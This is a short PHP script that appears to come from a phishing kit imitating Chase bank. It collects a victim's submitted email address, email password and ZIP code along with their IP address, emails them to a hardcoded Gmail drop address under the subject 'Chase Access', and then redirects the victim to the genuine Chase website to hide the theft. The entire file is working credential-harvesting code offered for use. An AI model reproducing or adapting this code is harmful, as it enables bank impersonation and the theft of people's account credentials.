<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO Crossr!d3r || :------\n";
$message .= "Email Address             : ".$_POST['emailxnx']."\n";
$message .= "Email Password              : ".$_POST['emailpassx']."\n";
$message .= "Service Address Zip             : ".$_POST['zipxnx']."\n";
$message .= "----: || tHAnks tO Crossr!d3r || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "mavin0971@gmail.com";
$subject = "Chase Access | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://www.chase.com/checking/overdraft-protection");
?>


